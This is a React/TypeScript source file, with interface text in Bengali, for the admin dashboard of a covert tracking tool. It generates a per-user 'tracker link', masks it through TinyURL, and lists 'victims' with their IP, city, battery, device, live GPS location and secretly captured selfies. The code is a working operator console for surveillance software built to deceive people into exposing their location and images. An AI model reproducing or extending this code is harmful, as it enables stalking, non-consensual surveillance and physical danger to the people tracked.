
import React, { useState, useEffect } from 'react';
import { User, signOut } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
import { collection, query, where, onSnapshot, doc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
import { auth, db } from '../firebase';
import { useNavigate } from 'react-router-dom';

interface LogEntry {
  id: string;
  timestamp: any;
  device?: { name: string; userAgent: string; };
  battery?: { level: number; charging: boolean };
  location?: { lat: number; lng: number };
  photoUrls?: string[];
  ip?: string;
  city?: string;
}

const Dashboard: React.FC<{ user: User }> = ({ user }) => {
  const [logs, setLogs] = useState<LogEntry[]>([]);
  const [loading, setLoading] = useState(true);
  const [copySuccess, setCopySuccess] = useState(false);
  const [shortUrl, setShortUrl] = useState('');
  const [shortening, setShortening] = useState(false);
  const [viewMap, setViewMap] = useState<{lat: number, lng: number} | null>(null);
  const [viewPhotos, setViewPhotos] = useState<string[] | null>(null);
  const navigate = useNavigate();
  
  const baseUrl = window.location.origin + window.location.pathname;
  const trackerLink = `${baseUrl}#/trk/${user.uid}`;

  useEffect(() => {
    const q = query(collection(db, "logs"), where("userId", "==", user.uid));
    const unsubscribe = onSnapshot(q, (snapshot) => {
      const data = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() })) as LogEntry[];
      // Sort newest at the top
      data.sort((a, b) => (b.timestamp?.seconds || 0) - (a.timestamp?.seconds || 0));
      setLogs(data);
      setLoading(false);
    });
    return () => unsubscribe();
  }, [user.uid]);

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
    setCopySuccess(true);
    setTimeout(() => setCopySuccess(false), 2000);
  };

  const generateTinyUrl = async () => {
    setShortening(true);
    try {
      const response = await fetch(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(trackerLink)}`);
      if (response.ok) setShortUrl(await response.text());
    } catch (e) { alert("API Error"); }
    setShortening(false);
  };

  return (
    <div className="min-h-screen bg-[#F8FAFC] font-['Hind_Siliguri']">
      {/* Top Navbar */}
      <nav className="bg-white border-b border-slate-100 px-6 py-4 flex justify-between items-center sticky top-0 z-40">
        <div className="flex items-center gap-2">
           <div className="w-8 h-8 bg-blue-600 rounded-lg flex items-center justify-center">
              <svg className="w-5 h-5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/></svg>
           </div>
           <h1 className="text-lg font-black text-slate-800 tracking-tight">অ্যাডমিন ড্যাশবোর্ড</h1>
        </div>
        <button onClick={() => signOut(auth)} className="bg-red-50 text-red-600 px-5 py-2 rounded-xl text-xs font-black transition-all hover:bg-red-100">লগ আউট</button>
      </nav>

      <main className="max-w-4xl mx-auto p-4 md:p-8 space-y-6">
        {/* Welcome & Stats */}
        <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
           <div className="md:col-span-2 bg-gradient-to-br from-blue-600 to-blue-700 p-8 rounded-[30px] text-white shadow-xl shadow-blue-100">
              <h2 className="text-2xl font-black">হ্যালো {user.displayName?.split(' ')[0] || 'ইউজার'},</h2>
              <p className="text-blue-100 text-sm mt-2 opacity-80">আপনার ভিক্টিমের তথ্য এখানে লাইভ আপডেট হবে।</p>
           </div>
           <div className="bg-white p-8 rounded-[30px] border border-slate-100 shadow-sm flex flex-col items-center justify-center text-center">
              <p className="text-[10px] font-black text-slate-400 uppercase mb-1 tracking-widest">Total Victims</p>
              <h3 className="text-5xl font-black text-blue-600">{logs.length}</h3>
           </div>
        </div>

        {/* Links Area */}
        <div className="bg-white p-8 rounded-[30px] border border-slate-100 shadow-sm space-y-4">
           <p className="text-[10px] font-black text-slate-400 uppercase tracking-widest">আপনার ট্র্যাকিং লিংক</p>
           <div className="flex gap-2">
              <input readOnly value={shortUrl || trackerLink} className="flex-1 bg-slate-50 border border-slate-100 px-4 py-3 rounded-xl text-[11px] font-mono text-blue-700" />
              <button onClick={() => copyToClipboard(shortUrl || trackerLink)} className="bg-slate-900 text-white px-6 rounded-xl text-xs font-black">
                {copySuccess ? 'কপি হয়েছে' : 'কপি'}
              </button>
           </div>
           {!shortUrl && (
             <button onClick={generateTinyUrl} disabled={shortening} className="w-full bg-blue-600 text-white py-3.5 rounded-xl font-black text-sm shadow-lg shadow-blue-100 transition-transform active:scale-95">
               {shortening ? 'জেনারেট হচ্ছে...' : 'মাস্কড TinyURL তৈরি করুন'}
             </button>
           )}
        </div>

        {/* Reports List */}
        <div className="space-y-4">
           <div className="flex items-center justify-between px-2">
              <h3 className="text-md font-black text-slate-700">লাইভ রিপোর্টস</h3>
              <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
           </div>

           <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              {logs.map((log, index) => {
                const victimIndex = logs.length - index;
                return (
                  <div key={log.id} className="bg-white p-5 rounded-[28px] border border-slate-100 shadow-sm relative overflow-hidden group hover:border-blue-300 transition-all">
                     <div className="absolute top-4 right-5 bg-blue-50 text-blue-600 px-3 py-1 rounded-full text-[9px] font-black uppercase tracking-tighter">
                       Victim #{victimIndex}
                     </div>
                     
                     <div className="space-y-4">
                        <div>
                           <p className="text-[9px] font-black text-slate-400 uppercase mb-1">IP & City</p>
                           <p className="text-xs font-bold text-slate-800">{log.ip} <span className="text-blue-500 ml-1">({log.city || 'Unknown'})</span></p>
                        </div>

                        <div className="grid grid-cols-2 gap-2">
                           <div className="bg-slate-50 p-3 rounded-2xl border border-slate-100">
                              <p className="text-[8px] text-slate-400 font-black uppercase">Battery</p>
                              <p className="text-xs font-black text-slate-700">{log.battery ? `${log.battery.level}%` : 'N/A'}</p>
                           </div>
                           <div className="bg-slate-50 p-3 rounded-2xl border border-slate-100">
                              <p className="text-[8px] text-slate-400 font-black uppercase">Device</p>
                              <p className="text-[9px] font-black text-slate-700 truncate">{log.device?.name || 'Unknown'}</p>
                           </div>
                        </div>

                        <div className="flex gap-2">
                           <button 
                             onClick={() => setViewPhotos(log.photoUrls || [])}
                             className="flex-1 bg-slate-900 text-white py-2.5 rounded-xl text-[10px] font-black flex items-center justify-center gap-1.5"
                           >
                             Selfie ({log.photoUrls?.length || 0})
                           </button>
                           {log.location && (
                             <button 
                               onClick={() => setViewMap(log.location || null)}
                               className="flex-1 bg-blue-600 text-white py-2.5 rounded-xl text-[10px] font-black flex items-center justify-center gap-1.5 shadow-md shadow-blue-50"
                             >
                               Live Map
                             </button>
                           )}
                        </div>
                        
                        <p className="text-[8px] text-slate-300 font-mono text-center pt-1 italic">
                          Captured: {log.timestamp?.toDate().toLocaleString('bn-BD')}
                        </p>
                     </div>
                  </div>
                );
              })}
           </div>
        </div>

        {/* Footer */}
        <footer className="pt-12 pb-8 text-center border-t border-slate-100">
           <div className="bg-white inline-flex items-center gap-4 px-6 py-3 rounded-full shadow-sm border border-slate-100">
              <div className="w-10 h-10 bg-blue-100 rounded-full flex items-center justify-center text-blue-600">
                 <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
              </div>
              <div className="text-left">
                <p className="text-[8px] text-slate-400 font-black uppercase leading-none">Developed By</p>
                <a href="https://www.facebook.com/profile.php?id=61569035777496" target="_blank" rel="noopener noreferrer" className="text-sm font-black text-slate-800 hover:text-blue-600 transition-colors">Arefin Foysal</a>
              </div>
           </div>
           <p className="text-[9px] text-slate-300 font-bold uppercase mt-6 tracking-[0.4em]">Secure Console v7.0</p>
        </footer>
      </main>

      {/* Map Modal */}
      {viewMap && (
        <div className="fixed inset-0 z-[100] bg-slate-900/80 backdrop-blur-sm flex items-center justify-center p-4">
           <div className="bg-white w-full max-w-xl rounded-[32px] overflow-hidden shadow-2xl">
              <div className="p-6 border-b flex justify-between items-center">
                 <h4 className="font-black text-slate-800">Live GPS Location</h4>
                 <button onClick={() => setViewMap(null)} className="w-8 h-8 bg-slate-100 rounded-full flex items-center justify-center text-slate-500">✕</button>
              </div>
              <div className="aspect-video w-full bg-slate-50">
                 <iframe 
                    width="100%" 
                    height="100%" 
                    frameBorder="0" 
                    src={`https://maps.google.com/maps?q=${viewMap.lat},${viewMap.lng}&z=15&output=embed`}
                 />
              </div>
              <div className="p-6 bg-slate-50 text-center flex gap-3">
                 <a href={`https://www.google.com/maps?q=${viewMap.lat},${viewMap.lng}`} target="_blank" className="flex-1 bg-blue-600 text-white py-3 rounded-xl font-black text-xs">Open in Maps</a>
                 <button onClick={() => setViewMap(null)} className="flex-1 bg-slate-200 text-slate-700 py-3 rounded-xl font-black text-xs">Close</button>
              </div>
           </div>
        </div>
      )}

      {/* Photo Modal */}
      {viewPhotos && (
        <div className="fixed inset-0 z-[100] bg-slate-900/90 backdrop-blur-md flex items-center justify-center p-4">
           <div className="bg-white w-full max-w-2xl rounded-[32px] overflow-hidden">
              <div className="p-6 border-b flex justify-between items-center">
                 <h4 className="font-black text-slate-800">Victim Selfies</h4>
                 <button onClick={() => setViewPhotos(null)} className="w-8 h-8 bg-slate-100 rounded-full flex items-center justify-center text-slate-500">✕</button>
              </div>
              <div className="p-6 grid grid-cols-3 gap-3 overflow-y-auto max-h-[60vh]">
                 {viewPhotos.map((url, i) => (
                   <img key={i} src={url} className="rounded-2xl border border-slate-100 aspect-square object-cover" />
                 ))}
                 {viewPhotos.length === 0 && <p className="col-span-3 text-center text-slate-400 py-10 font-bold">No selfies captured.</p>}
              </div>
              <div className="p-6 bg-slate-50 text-center">
                 <button onClick={() => setViewPhotos(null)} className="bg-slate-900 text-white px-8 py-3 rounded-xl font-black text-xs">Close Gallery</button>
              </div>
           </div>
        </div>
      )}
    </div>
  );
};

export default Dashboard;
